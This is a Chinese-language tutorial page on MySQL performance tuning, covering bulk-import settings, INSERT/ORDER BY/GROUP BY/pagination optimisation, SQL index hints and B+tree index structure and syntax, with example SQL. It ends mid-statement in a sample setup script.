<h4 id="提高导入效率"><a href="#提高导入效率" class="headerlink" title="提高导入效率"></a>提高导入效率</h4><h5 id="主键顺序插入"><a href="#主键顺序插入" class="headerlink" title="主键顺序插入"></a>主键顺序插入</h5><p>InnoDB类型的表是按照主键的顺序保存的，所以将导入的数据按照主键的顺序排列，可以有效的提高导入数据的效率。如果InnoDB表没有主键，那么系统会自动默认创建一个内部列作为主键，所以如果可以给表创建一个主键，将可以利用这点，来提高导入数据的效率</p>
<h5 id="导入有序表"><a href="#导入有序表" class="headerlink" title="导入有序表"></a>导入有序表</h5><p><img src="https://csn.damyoung.cn/image-20201021140542607.png" alt="image-20201021140542607"></p>
<h5 id="导入无序表"><a href="#导入无序表" class="headerlink" title="导入无序表"></a>导入无序表</h5><p><img src="https://csn.damyoung.cn/image-20201021140743217.png" alt="image-20201021140743217"></p>
<h4 id="关闭唯一性校验"><a href="#关闭唯一性校验" class="headerlink" title="关闭唯一性校验"></a>关闭唯一性校验</h4><p>在导入数据前执行 set unique_checks=0，关闭唯一性校验，在导入结束后执行SET UNIQUE_CHECKS=1，恢复唯一性校验，可以提高导入的效率</p>
<h4 id="手动提交事务"><a href="#手动提交事务" class="headerlink" title="手动提交事务"></a>手动提交事务</h4><p>如果应用使用自动提交的方式，建议在导入前执行 SET AUTOCOMMIT=0，关闭自动提交，导入结束后再执行 SET AUTOCOMMIT=1，打开自动提交，也可以提高导入的效率</p>
<h3 id="优化insert语句"><a href="#优化insert语句" class="headerlink" title="优化insert语句"></a>优化insert语句</h3><h4 id="减少连接次数"><a href="#减少连接次数" class="headerlink" title="减少连接次数"></a>减少连接次数</h4><ul>
<li>如果需要同时对一张表插入很多行数据时，应该尽量使用多个值表的insert语句，这种方式将大大的<strong>缩减客户端与数据库之间的连接、关闭等消耗</strong>。使得效率比分开执行的单个insert语句快。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_test <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;Tom&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_test <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;Cat&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_test <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;Jerry&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>优化后的方案为 ： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into tb_test values(1,&#39;Tom&#39;),(2,&#39;Cat&#39;)，(3,&#39;Jerry&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="在事务中进行数据插入"><a href="#在事务中进行数据插入" class="headerlink" title="在事务中进行数据插入"></a>在事务中进行数据插入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">insert into tb_test values(1,&#39;Tom&#39;);</span><br><span class="line">insert into tb_test values(2,&#39;Cat&#39;);</span><br><span class="line">insert into tb_test values(3,&#39;Jerry&#39;);</span><br><span class="line">commit;</span><br></pre></td></tr></table></figure>

<h4 id="数据有序插入"><a href="#数据有序插入" class="headerlink" title="数据有序插入"></a>数据有序插入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into tb_test values(4,&#39;Tim&#39;);</span><br><span class="line">insert into tb_test values(1,&#39;Tom&#39;);</span><br><span class="line">insert into tb_test values(3,&#39;Jerry&#39;);</span><br><span class="line">insert into tb_test values(5,&#39;Rose&#39;);</span><br><span class="line">insert into tb_test values(2,&#39;Cat&#39;);</span><br></pre></td></tr></table></figure>

<p>优化后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into tb_test values(1,&#39;Tom&#39;);</span><br><span class="line">insert into tb_test values(2,&#39;Cat&#39;);</span><br><span class="line">insert into tb_test values(3,&#39;Jerry&#39;);</span><br><span class="line">insert into tb_test values(4,&#39;Tim&#39;);</span><br><span class="line">insert into tb_test values(5,&#39;Rose&#39;);</span><br></pre></td></tr></table></figure>

<h3 id="优化order-by语句"><a href="#优化order-by语句" class="headerlink" title="优化order by语句"></a>优化order by语句</h3><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;emp&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;name&#96; varchar(100) NOT NULL,</span><br><span class="line">  &#96;age&#96; int(3) NOT NULL,</span><br><span class="line">  &#96;salary&#96; int(11) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB  DEFAULT CHARSET&#x3D;utf8mb4;</span><br><span class="line"></span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;1&#39;,&#39;Tom&#39;,&#39;25&#39;,&#39;2300&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;2&#39;,&#39;Jerry&#39;,&#39;30&#39;,&#39;3500&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;3&#39;,&#39;Luci&#39;,&#39;25&#39;,&#39;2800&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;4&#39;,&#39;Jay&#39;,&#39;36&#39;,&#39;3500&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;5&#39;,&#39;Tom2&#39;,&#39;21&#39;,&#39;2200&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;6&#39;,&#39;Jerry2&#39;,&#39;31&#39;,&#39;3300&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;7&#39;,&#39;Luci2&#39;,&#39;26&#39;,&#39;2700&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;8&#39;,&#39;Jay2&#39;,&#39;33&#39;,&#39;3500&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;9&#39;,&#39;Tom3&#39;,&#39;23&#39;,&#39;2400&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;10&#39;,&#39;Jerry3&#39;,&#39;32&#39;,&#39;3100&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;11&#39;,&#39;Luci3&#39;,&#39;26&#39;,&#39;2900&#39;);</span><br><span class="line">insert into &#96;emp&#96; (&#96;id&#96;, &#96;name&#96;, &#96;age&#96;, &#96;salary&#96;) values(&#39;12&#39;,&#39;Jay3&#39;,&#39;37&#39;,&#39;4500&#39;);</span><br><span class="line"></span><br><span class="line">create index idx_emp_age_salary on emp(age,salary);</span><br></pre></td></tr></table></figure>

<h4 id="filesort排序"><a href="#filesort排序" class="headerlink" title="filesort排序"></a>filesort排序</h4><blockquote>
<p>通过<strong>对返回数据进行排序</strong>，也就是通常说的 <code>filesort</code> 排序，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序。</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201020212512988.png" alt="image-20201020212512988" style="zoom:80%;" />

<h4 id="using-index排序"><a href="#using-index排序" class="headerlink" title="using index排序"></a>using index排序</h4><blockquote>
<p>通过有序索引顺序扫描<strong>直接返回有序数据</strong>，这种情况即为 using index，不需要额外排序，操作效率高。</p>
<p>id,age,salary均有索引</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020212818703.png" alt="image-20201020212818703"></p>
<p><img src="https://csn.damyoung.cn/image-20201020212944165.png" alt="image-20201020212944165"></p>
<h4 id="字段排序"><a href="#字段排序" class="headerlink" title="字段排序"></a>字段排序</h4><blockquote>
<ul>
<li>尽量减少额外的排序，通过索引直接返回有序数据。</li>
<li>where 条件和Order by 使用相同的索引，</li>
<li>Order By 的顺序和索引顺序相同， </li>
<li>Order  by 的字段都是升序，或者都是降序。否则肯定需要额外的操作，这样就会出现FileSort。</li>
</ul>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020213149376.png" alt="image-20201020213149376"></p>
<h4 id="filesort的优化"><a href="#filesort的优化" class="headerlink" title="filesort的优化"></a>filesort的优化</h4><blockquote>
<p>通过创建合适的索引，能够减少 Filesort 的出现，在某些情况下，条件限制不能让Filesort消失，那就需要加快 Filesort的排序操作</p>
</blockquote>
<blockquote>
<p>对于Filesort ， MySQL 有两种排序算法</p>
<p>通过比较系统变量 <code>max_length_for_sort_data</code> 和<code>查询语句</code>取出的字段总大小， 来判定是否那种排序算法</p>
<p>如果<code>max_length_for_sort_data</code> 更大，那么使用第二种优化之后的算法；否则使用第一种。</p>
</blockquote>
<ul>
<li><p>两次扫描算法</p>
<ul>
<li>首先根据条件取出<strong>排序字段和行指针信息</strong>，在排序区 sort buffer 中排序。</li>
<li>如果sort buffer不够，则在临时表 temporary table 中存储排序结果。</li>
<li>完成排序之后，再根据行指针回表读取记录，该操作可能会导致大量随机I/O操作。</li>
</ul>
</li>
<li><p>一次扫描算法：<strong>一次性</strong>取出满足条件的所有字段，然后在排序区 sort  buffer 中排序后直接输出结果集。</p>
<p>​                           排序时<strong>内存开销较大</strong>，但是排序效率比两次扫描算法要高。</p>
</li>
<li><p>可以适当提高 <code>sort_buffer_size</code>  和 <code>max_length_for_sort_data</code>  系统变量，来增大排序区的大小，提高排序的效率。</p>
</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201020214259798.png" alt="image-20201020214259798" style="zoom:80%;" />

<h3 id="优化group-by语句"><a href="#优化group-by语句" class="headerlink" title="优化group by语句"></a>优化group by语句</h3><blockquote>
<ul>
<li>GROUP BY 也会进行排序操作</li>
<li>与ORDER BY 相比,GROUP BY 主要只是多了排序之后的分组操作。</li>
<li>如果在分组的时候还使用了其他的一些聚合函数，那么还需要一些聚合函数的计算</li>
</ul>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201021133617215.png" alt="image-20201021133617215"></p>
<h4 id="禁止排序"><a href="#禁止排序" class="headerlink" title="禁止排序"></a>禁止排序</h4><blockquote>
<p>如果查询包含 group by 但是用户想要避免排序结果的消耗， 则可以执行<code>order by null</code> 禁止排序</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explain select age,count(*) from emp group by age order by null;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201021133640908.png" alt="image-20201021133640908"></p>
<h4 id="使用索引"><a href="#使用索引" class="headerlink" title="使用索引"></a>使用索引</h4><blockquote>
<p>在GROUP BY 的实现过程中，与 ORDER BY 一样也可以利用到索引。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create index idx_emp_age_salary on emp(age,salary)；</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201021133738142.png" alt="image-20201021133738142" style="zoom:80%;" />

<h3 id="优化子查询"><a href="#优化子查询" class="headerlink" title="优化子查询"></a>优化子查询</h3><p>使用子查询可以一次性的完成很多逻辑上需要多个步骤才能完成的SQL操作，同时也可以避免事务或者表锁死，并且写起来也很容易。</p>
<blockquote>
<p><strong>子查询是可以被更高效的多表连接查询<code>join</code>替代</strong>。</p>
</blockquote>
<h4 id="使用连接查询"><a href="#使用连接查询" class="headerlink" title="使用连接查询"></a>使用连接查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explain select * from t_user where id in (select user_id from user_role );</span><br></pre></td></tr></table></figure>

<p>优化后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 多表查询</span><br><span class="line">explain select * from t_user u , user_role ur where u.id &#x3D; ur.user_id;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>连接(Join)查询之所以更有效率一些 ，是因为MySQL不需要在内存中<strong>创建临时表</strong>来完成这个逻辑上需要两个步骤的查询工作</p>
</blockquote>
<h3 id="优化or条件"><a href="#优化or条件" class="headerlink" title="优化or条件"></a>优化or条件</h3><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><blockquote>
<ul>
<li>每个条件必须用到索引</li>
<li>只能使用单值索引，不能使用复合索引</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201021141923214.png" alt="image-20201021141923214" style="zoom:80%;" />

<h4 id="使用union替换"><a href="#使用union替换" class="headerlink" title="使用union替换"></a>使用union替换</h4><blockquote>
<ul>
<li><p>UNION 语句的 type 值为 <code>ref</code>，OR 语句的 type 值为 <code>range</code>，可以看到这是一个很明显的差距</p>
</li>
<li><p>UNION 语句的 ref 值为 <code>const</code>，OR 语句的 ref 值为 <code>null</code>，<strong>const 表示是常量值引用，非常快</strong></p>
</li>
</ul>
<p>这两项的差距就说明了 UNION 要优于 OR 。</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201021142314495.png" alt="image-20201021142314495"></p>
<h3 id="优化分页查询"><a href="#优化分页查询" class="headerlink" title="优化分页查询"></a>优化分页查询</h3><p>一般分页查询时，通过创建覆盖索引能够比较好地提高性能。</p>
<blockquote>
<p>一个常见又非常头疼的问题就是 limit 2000000,10  ，此时需要MySQL排序前2000010 记录，仅仅返回2000000 - 2000010 的记录，其他记录丢弃，查询排序的代价非常大</p>
</blockquote>
<h4 id="索引排序"><a href="#索引排序" class="headerlink" title="索引排序"></a>索引排序</h4><blockquote>
<p>在<strong>索引上完成排序分页</strong>操作，最后根据主键关联回原表查询所需要的其他列内容。</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201021143105977.png" alt="image-20201021143105977"></p>
<h4 id="条件查询替换"><a href="#条件查询替换" class="headerlink" title="条件查询替换"></a>条件查询替换</h4><blockquote>
<p>该方案适用于主键自增的表，可以把Limit 查询转换成某个位置的查询 。</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201021143356602.png" alt="image-20201021143356602" style="zoom:80%;" />

<h3 id="SQL提示"><a href="#SQL提示" class="headerlink" title="SQL提示"></a>SQL提示</h3><h4 id="use-index"><a href="#use-index" class="headerlink" title="use index"></a>use index</h4><p>在查询语句中表名的后面，添加 use index 来提供希望MySQL去参考的索引列表，就可以让MySQL不再考虑其他可用的索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create index idx_seller_name on tb_seller(name);</span><br><span class="line">explain select *from tb_seller use index(idx_seller_name) where name&#x3D;&#39;小米科技&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201021143950081.png" alt="image-20201021143950081"></p>
<h4 id="ignore-index"><a href="#ignore-index" class="headerlink" title="ignore index"></a>ignore index</h4><p>用户只是单纯的想让MySQL忽略一个或者多个索引，则可以使用 ignore index 作为 hint 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explain select * from tb_seller ignore index(idx_seller_name) where name &#x3D; &#39;小米科技&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201021144137493.png" alt="image-20201021144137493"></p>
<h4 id="force-index"><a href="#force-index" class="headerlink" title="force index"></a>force index</h4><p>为强制MySQL使用一个特定的索引，可在查询中使用 force index 作为hint 。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create index idx_seller_address on tb_seller(address);</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201021144427022.png" alt="image-20201021144427022" style="zoom:80%;" />

<h1 id="索引-1"><a href="#索引-1" class="headerlink" title="索引"></a>索引</h1><h2 id="索引分析"><a href="#索引分析" class="headerlink" title="索引分析"></a>索引分析</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="索引作用"><a href="#索引作用" class="headerlink" title="索引作用"></a>索引作用</h4><ul>
<li><p><strong>索引是帮助MySql高效获取数据的数据结构B+树(有序)</strong></p>
</li>
<li><p>索引是数据库中用来<strong>提高性能</strong>的常用工具</p>
</li>
<li><p>索引往往以索引文件的形式存储在<strong>磁盘</strong>上。</p>
</li>
</ul>
<img src="https://csn.damyoung.cn/ss.png" alt="ss" style="zoom:80%;" />

<h4 id="优劣势"><a href="#优劣势" class="headerlink" title="优劣势"></a>优劣势</h4><p><strong>优势</strong></p>
<ul>
<li>提高数据检索的效率，降低数据库的IO成本</li>
<li>通过索引对数据进行排序，降低数据排序的成本，降低CPU的消耗</li>
</ul>
<p><strong>劣势</strong></p>
<ul>
<li>索引也是一张表，保存了主键与索引字段，并指向实体类的记录，占用空间</li>
<li>提高了查询效率，但也降低了更新表的速度。更新表时，还需要保存一下索引文件每次更新添加索引列的字段，都会调整因为更新带来的键值变化后的索引信息</li>
</ul>
<h4 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h4><ul>
<li>BTREE 索引 ： 最常见的索引类型，大部分索引都支持 B 树索引。</li>
<li>HASH 索引：只有Memory引擎支持 ， 使用场景简单 。</li>
<li>R-tree 索引（空间索引）：空间索引是MyISAM引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少，不做特别介绍。</li>
<li>Full-text （全文索引） ：全文索引也是MyISAM的一个特殊索引类型，主要用于全文索引，InnoDB从Mysql5.6版本开始支持全文索引。</li>
</ul>
<table>
<thead>
<tr>
<th>索引</th>
<th>InnoDB引擎</th>
<th>MyISAM引擎</th>
<th>Memory引擎</th>
</tr>
</thead>
<tbody><tr>
<td>BTREE索引</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>HASH 索引</td>
<td>不支持</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr>
<td>R-tree 索引</td>
<td>不支持</td>
<td>支持</td>
<td>不支持</td>
</tr>
<tr>
<td>Full-text</td>
<td>5.6版本之后支持</td>
<td>支持</td>
<td>不支</td>
</tr>
</tbody></table>
<p>索引，如果没有特别指明，都是指B+树（多路搜索树，并不一定是二叉的）结构组织的索引。其中聚集索引、复合索引、前缀索引、唯一索引默认都是使用 B+tree 索引，统称为 索引</p>
<h3 id="索引数据结构"><a href="#索引数据结构" class="headerlink" title="索引数据结构"></a>索引数据结构</h3><p><strong>索引是在MySQL的存储引擎层实现</strong></p>
<h4 id="BTree结构"><a href="#BTree结构" class="headerlink" title="BTree结构"></a>BTree结构</h4><p><strong>因为对于相同的数据量来说，BTREE的层级结构比二叉树小，因此搜索速度快。</strong></p>
<blockquote>
<p>B+树-多路平衡搜索树</p>
</blockquote>
<h5 id="m叉树特性"><a href="#m叉树特性" class="headerlink" title="m叉树特性"></a><strong>m叉树特性</strong></h5><blockquote>
<ul>
<li>树中每个节点最多包含m个孩子。</li>
<li>除根节点与叶子节点外，每个节点至少有[ceil(m/2)]个孩子。</li>
<li>若根节点不是叶子节点，则至少有两个孩子。</li>
<li>所有的叶子节点都在同一层。</li>
<li>每个非叶子节点由n个key与n+1个指针组成，其中[ceil(m/2)-1] &lt;= n &lt;= m-1 </li>
</ul>
</blockquote>
<h6 id="构建m叉树"><a href="#构建m叉树" class="headerlink" title="构建m叉树"></a>构建m叉树</h6><blockquote>
<p>以5叉BTree为例</p>
<p><strong>key的数量</strong>：公式推导[ceil(m/2)-1] &lt;= n &lt;= m-1，2 &lt;= n &lt;=4 。</p>
<p>当n&gt;4时，中间节点分裂到父节点，两边节点分裂。</p>
</blockquote>
<p>插入 C N G A H E K Q M F W L T Z D P R X Y S 数据为例。</p>
<p>演变过程如下：</p>
<p>1). 插入前4个字母 C N G A </p>
<p><img src="https://csn.damyoung.cn/1555944126588.png" alt="1555944126588"> </p>
<p>2). 插入H，n&gt;4，中间元素G字母向上分裂到新的节点</p>
<p><img src="https://csn.damyoung.cn/1555944549825.png" alt="1555944549825"> </p>
<p>3). 插入E，K，Q不需要分裂</p>
<p><img src="https://csn.damyoung.cn/1555944596893.png" alt="1555944596893"> </p>
<p>4). 插入M，中间元素M字母向上分裂到父节点G</p>
<p><img src="https://csn.damyoung.cn/1555944652560.png" alt="1555944652560"> </p>
<p>5). 插入F，W，L，T不需要分裂</p>
<p><img src="https://csn.damyoung.cn/1555944686928.png" alt="1555944686928"> </p>
<p>6). 插入Z，中间元素T向上分裂到父节点中 </p>
<p><img src="https://csn.damyoung.cn/1555944713486.png" alt="1555944713486"> </p>
<p>7). 插入D，中间元素D向上分裂到父节点中。然后插入P，R，X，Y不需要分裂</p>
<p><img src="https://csn.damyoung.cn/1555944749984.png" alt="1555944749984"> </p>
<p>8). 最后插入S，NPQR节点n&gt;5，中间节点Q向上分裂，但分裂后父节点DGMT的n&gt;5，中间节点M向上分裂</p>
<p><img src="https://csn.damyoung.cn/1555944848294.png" alt="1555944848294"> </p>
<h4 id="B-TREE-结构"><a href="#B-TREE-结构" class="headerlink" title="B+TREE 结构"></a>B+TREE 结构</h4><ul>
<li>由于B+Tree只有叶子节点保存key信息，<strong>查询任何key都要从root走到叶子</strong>。所以B+Tree的<strong>查询效率更加稳定。</strong></li>
</ul>
<p>B+Tree为BTree的变种，B+Tree与BTree的区别为：</p>
<blockquote>
<ul>
<li>m叉B+Tree最多含有m个key，而BTree最多含有m-1个key。</li>
<li>B+Tree的叶子节点保存所有的key信息，依key大小顺序排列。</li>
<li>所有的非叶子节点都可以看作是key的索引部分。</li>
</ul>
</blockquote>
<p><img src="https://csn.damyoung.cn/00001.jpg" alt="1555906287178"> </p>
<h4 id="MySQL中的B-Tree"><a href="#MySQL中的B-Tree" class="headerlink" title="MySQL中的B+Tree"></a>MySQL中的B+Tree</h4><p>MySql索引数据结构对经典的B+Tree进行了优化。</p>
<p>在原B+Tree的基础上，<strong>增加一个指向相邻叶子节点的链表指针，就形成了带有顺序指针的B+Tree，提高区间访问的性能。</strong></p>
<p><img src="https://csn.damyoung.cn/1555906287178.png" alt="1555906287178">  </p>
<h3 id="索引分类-1"><a href="#索引分类-1" class="headerlink" title="索引分类"></a>索引分类</h3><ul>
<li>单值索引 ：即一个索引只包含单个列，一个表可以有多个单列索引</li>
<li>唯一索引 ：索引列的值必须唯一，但允许有空值</li>
<li>复合索引 ：即一个索引包含多个列</li>
</ul>
<h3 id="索引语法"><a href="#索引语法" class="headerlink" title="索引语法"></a>索引语法</h3><p>可以创建表同时创建，也可以随时创建新的索引</p>
<h4 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database demo_01 default charset&#x3D;utf8mb4;</span><br><span class="line"></span><br><span class="line">use demo_01;</span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;city&#96; (</span><br><span class="line">  &#96;city_id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;city_name&#96; varchar(50) NOT NULL,</span><br><span class="line">  &#96;country_id&#96; int(11) NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;city_id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;country&#96; (</span><br><span class="line">  &#96;country_id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;country_name&#96; varchar(100) NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;country_id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">insert into &#96;city&#96; (&#96;city_id&#96;, &#96;city_name&#96;, &#96;country_id&#96;) values(1,&#39;西安&#39;,1);</span><br><span class="line">insert into &#96;city&#96; (&#96;city_id&#96;, &#96;city_name&#96;, &#96;country_id&#96;) values(2,&#39;NewYork&#39;,2);</span><br><span class="line">insert into &#96;city&#96; (&#96;city_id&#96;, &#96;city_name&#96;, &#96;country_id&#96;) values(3,&#39;北京&#39;,1);</span><br><span class="line">insert into &#96;city&#96; (&#96;city_id&#96;, &#96;city_name&#96;, &#96;country_id&#96;) values(4,&#39;上海&#39;,1);</span><br><span class="line"></span><br><span class="line">insert into &#96;country&#96; ( country_id, country_name) values(1,&#39;China&#39;);</span><br><span class="line">insert into &#96;country&#96; (&#96;country_id&#96;, country_name) values(2,&#39;America&#39;);</span><br><span class="line">insert into &#96;country&#96; (&#96;country_id&#96;, &#96;country_name&#96;) values(3,&#39;Japan&#39;);</span><br><span class="line">insert into &#96;country&#96; (&#96;country_id&#96;, &#96;country_name&#96;) values(4,&#39;UK&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="主键索引"><a href="#主键索引" class="headerlink" title="主键索引"></a>主键索引</h4><p>创建表时，主键自带主键索引 primary-key</p>
<h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><blockquote>
<p><strong>create index</strong> 索引名称 <strong>on</strong> 表名(字段名)</p>
<p><strong>默认索引数据结构BTREE;</strong></p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201018195002240.png" alt="image-20201018195002240"></p>
<h4 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h4><blockquote>
<p>show index from 表名\G;</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/ss.png" alt="image-20201018195115914"></p>
<h4 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h4><blockquote>
<p>drop index 索引名 on 表名</p>
</blockquote>
<img src="https://csn.damyoung.cn/ss.png" alt="image-20201018195404722" style="zoom:80%;" />

<h4 id="创建唯一索引"><a href="#创建唯一索引" class="headerlink" title="创建唯一索引"></a>创建唯一索引</h4><blockquote>
<p>alter table 表名 add unique 索引名(字段名)；</p>
</blockquote>
<blockquote>
<ul>
<li>这条语句创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/ss.png" alt="image-20201018200026641" style="zoom:80%;" />

<blockquote>
<p>alter  table  tb_name  add  index 索引名(字段名);</p>
<ul>
<li>添加普通索引， 索引值重复可出现多次。</li>
</ul>
</blockquote>
<blockquote>
<p>alter  table  tb_name  add  fulltext  索引名(字段名);    </p>
<ul>
<li>该语句指定了索引为<strong>FULLTEXT</strong>， 用于<strong>全文索引</strong></li>
</ul>
</blockquote>
<h4 id="创建复合索引"><a href="#创建复合索引" class="headerlink" title="创建复合索引"></a>创建复合索引</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">创建复合索引:</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> idx_name_email_status <span class="keyword">ON</span> tb_seller(<span class="keyword">NAME</span>,email,<span class="keyword">STATUS</span>);</span><br><span class="line"></span><br><span class="line">就相当于</span><br><span class="line">	对name 创建索引 ;</span><br><span class="line">	对name , email 创建了索引 ;s</span><br><span class="line">	对name , email, status 创建了索引 ;</span><br></pre></td></tr></table></figure>

<h3 id="索引设计原则"><a href="#索引设计原则" class="headerlink" title="索引设计原则"></a>索引设计原则</h3><ul>
<li>查询频次较高且数据量较大的表建立索引</li>
<li>索引字段：选择经常在<strong>where</strong>的条件中使用的字段提取</li>
<li>尽量使用<strong>唯一索引</strong>，区分度较高，使用索引的效率较高</li>
<li>可以有效提高查询数据的效率，索引越多，维护索引的<strong>代价</strong>就越高；对于insert、delete、update的DML操作较为频繁的表来说，索引过多，会引入相当高的维护代价，降低DML操作的效率。增加相应操作的时间消耗。</li>
<li>索引创建后也是使用硬盘进行存储，使用<strong>短索引</strong>可以提升索引访问的I/O效率。</li>
<li>利用<strong>最左前缀</strong>，N个列组合而成的组合索引，那么相当于是创建了N个索引，如果查询时<strong>where子句中使用了组成该索引的前几个字段</strong>，那么这条查询SQL可以利用<strong>复合索引</strong>来提升查询效率</li>
</ul>
<h2 id="索引的使用"><a href="#索引的使用" class="headerlink" title="索引的使用"></a>索引的使用</h2><p>索引是数据库优化最常用也是最重要的手段之一, 通过索引通常可以帮助用户解决大多数的MySQL的性能优化问题。</p>
<h3 id="环境准备-2"><a href="#环境准备-2" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table &#96;tb_seller&#96; (</span><br><span class="line">	&#96;sellerid&#96; varchar (100),</span><br><span class="line">	&#96;name&#96; varchar (100),</span><br><span class="line">	&#96;nickname&#96; varchar (50),</span><br><span class="line">	&#96;password&#96; varchar (60),</span><br><span class="line">	&#96;status&#96; varchar (1),</span><br><span class="line">	&#96;address&#96; varchar (100),</span><br><span class="line">	&#96;createtime&#96; datetime,</span><br><span class="line">    primary key(&#96;sellerid&#96;)</span><br><span class="line">)engine&#x3D;innodb default charset&#x3D;utf8mb4; </span><br><span class="line"></span><br><span class="line">insert into &#96;tb_seller&#96; (&#96;sellerid&#96;, &#96;name&#96;, &#96;nickname&#96;, &#96;password&#96;, &#96;status&#96;, &#96;address&#96;, &#96;createtime&#96;) 